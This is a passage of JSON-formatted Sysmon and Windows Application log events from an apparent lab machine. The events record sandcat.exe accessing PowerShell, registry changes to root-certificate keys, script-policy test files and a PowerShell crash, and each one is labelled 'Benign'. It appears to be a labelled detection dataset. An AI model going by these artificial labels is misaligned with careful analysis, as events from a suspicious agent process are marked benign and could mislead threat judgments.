(WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":2100,"thread":null,"entity_id":"{04787c88-01c9-623b-f301-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"1","api":"wineventlog","record_id":9255,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T11:17:30.899Z","code":"1"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T11:17:29.703Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Process accessed:\nRuleName: technique_id=T1036,technique_name=Masquerading\nUtcTime: 2022-03-23 11:17:29.703\nSourceProcessGUID: {04787c88-fdd6-623a-7601-000000000c00}\nSourceProcessId: 4192\nSourceThreadId: 6796\nSourceImage: C:\\Users\\Public\\sandcat.exe\nTargetProcessGUID: {04787c88-01c9-623b-f301-000000000c00}\nTargetProcessId: 2100\nTargetImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nGrantedAccess: 0x1FFFFF\nCallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9d934|C:\\Windows\\System32\\KERNELBASE.dll+5f32a|C:\\Windows\\System32\\KERNELBASE.dll+5bcc6|C:\\Windows\\System32\\KERNEL32.DLL+1be93|C:\\Users\\Public\\sandcat.exe+641de\nSourceUser: WIN10\\vagrant\nTargetUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":4192,"thread":{"id":6796},"entity_id":"{04787c88-fdd6-623a-7601-000000000c00}","executable":"C:\\Users\\Public\\sandcat.exe","name":"sandcat.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"10","api":"wineventlog","record_id":9256,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T11:17:30.899Z","code":"10"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T11:17:29.723Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Image loaded:\nRuleName: technique_id=T1059.001,technique_name=PowerShell\nUtcTime: 2022-03-23 11:17:29.723\nProcessGuid: {04787c88-01c9-623b-f301-000000000c00}\nProcessId: 2100\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nImageLoaded: C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\6b621f0fd6cc913157b16d8a0cfdc3ec\\System.Management.Automation.ni.dll\nFileVersion: 10.0.18362.145\nDescription: System.Management.Automation\nProduct: Microsoft (R) Windows (R) Operating System\nCompany: Microsoft Corporation\nOriginalFileName: System.Management.Automation.dll\nHashes: SHA1=A03FCAE0C1F4BC4A81F0819DBB94289C373B1052,MD5=B18E1C187DAEB6C9B195BDD2EFDC20C7,SHA256=D36AD842C5E44483BDBBDF13D045AD5A64A9DDD5C1BAB89E81B12299D89DFC27,IMPHASH=00000000000000000000000000000000\nSigned: false\nSignature: -\nSignatureStatus: Unavailable\nUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":2100,"thread":null,"entity_id":"{04787c88-01c9-623b-f301-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"7","api":"wineventlog","record_id":9257,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T11:17:30.899Z","code":"7"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T11:17:29.756Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Registry object added or deleted:\nRuleName: technique_id=T1130,technique_name=Install Root Certificate\nEventType: CreateKey\nUtcTime: 2022-03-23 11:17:29.756\nProcessGuid: {04787c88-01c9-623b-f301-000000000c00}\nProcessId: 2100\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetObject: HKU\\S-1-5-21-1265589927-3242731326-451682020-1000\\Software\\Microsoft\\SystemCertificates\\Root\\Certificates\nUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":2100,"thread":null,"entity_id":"{04787c88-01c9-623b-f301-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"12","api":"wineventlog","record_id":9258,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T11:17:30.899Z","code":"12"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T11:17:29.756Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Registry object added or deleted:\nRuleName: technique_id=T1130,technique_name=Install Root Certificate\nEventType: CreateKey\nUtcTime: 2022-03-23 11:17:29.756\nProcessGuid: {04787c88-01c9-623b-f301-000000000c00}\nProcessId: 2100\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetObject: HKLM\\SOFTWARE\\Microsoft\\SystemCertificates\\ROOT\\Certificates\nUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":2100,"thread":null,"entity_id":"{04787c88-01c9-623b-f301-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"12","api":"wineventlog","record_id":9259,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T11:17:30.899Z","code":"12"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T11:17:29.756Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Registry object added or deleted:\nRuleName: technique_id=T1130,technique_name=Install Root Certificate\nEventType: CreateKey\nUtcTime: 2022-03-23 11:17:29.756\nProcessGuid: {04787c88-01c9-623b-f301-000000000c00}\nProcessId: 2100\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetObject: HKLM\\SOFTWARE\\Microsoft\\EnterpriseCertificates\\Root\\Certificates\nUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":2100,"thread":null,"entity_id":"{04787c88-01c9-623b-f301-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"12","api":"wineventlog","record_id":9260,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T11:17:30.899Z","code":"12"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T11:17:29.787Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"File created:\nRuleName: technique_id=T1059.001,technique_name=PowerShell\nUtcTime: 2022-03-23 11:17:29.787\nProcessGuid: {04787c88-01c9-623b-f301-000000000c00}\nProcessId: 2100\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetFilename: C:\\Users\\vagrant\\AppData\\Local\\Temp\\__PSScriptPolicyTest_oz4f10bk.v1f.ps1\nCreationUtcTime: 2022-03-23 11:17:29.787\nUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":2100,"thread":null,"entity_id":"{04787c88-01c9-623b-f301-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"11","api":"wineventlog","record_id":9261,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T11:17:30.899Z","code":"11"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T11:17:29.803Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"File Delete archived:\nRuleName: -\nUtcTime: 2022-03-23 11:17:29.803\nProcessGuid: {04787c88-01c9-623b-f301-000000000c00}\nProcessId: 2100\nUser: WIN10\\vagrant\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetFilename: C:\\Users\\vagrant\\AppData\\Local\\Temp\\__PSScriptPolicyTest_oz4f10bk.v1f.ps1\nHashes: SHA1=6AB83620379FC69F80C0242105DDFFD7D98D5D9D,MD5=D17FE0A3F47BE24A6453E9EF58C94641,SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7,IMPHASH=00000000000000000000000000000000\nIsExecutable: false\nArchived: true","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":2100,"thread":null,"entity_id":"{04787c88-01c9-623b-f301-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"23","api":"wineventlog","record_id":9262,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":null},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T11:17:30.899Z","code":"23"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T11:17:30.761Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Faulting application name: powershell.exe, version: 10.0.18362.1, time stamp: 0xfce6740d\nFaulting module name: mscorlib.ni.dll, version: 4.8.4018.0, time stamp: 0x5d4a6683\nException code: 0xc0000005\nFault offset: 0x00000000005585a5\nFaulting process id: 0x834\nFaulting application start time: 0x01d83ea7958e85bb\nFaulting application path: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nFaulting module path: C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\mscorlib\\ec23d1294499b4ffba61f212cb1217cd\\mscorlib.ni.dll\nReport Id: c6c8246f-c9e1-4d8b-98c4-64d87302201e\nFaulting package full name: \nFaulting package-relative application ID: ","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":null,"winlog":{"channel":"Application","event_id":"1000","api":"wineventlog","record_id":464,"computer_name":"win10.windomain.local","provider_name":"Application Error","provider_guid":null,"keywords":["Classic"],"event_data":{"param2":"10.0.18362.1","param1":"powershell.exe"}},"event":{"kind":"event","provider":"Application Error","created":"2022-03-23T11:17:31.770Z","code":"1000"},"log":{"level":"error"},"verdict":"Benign"},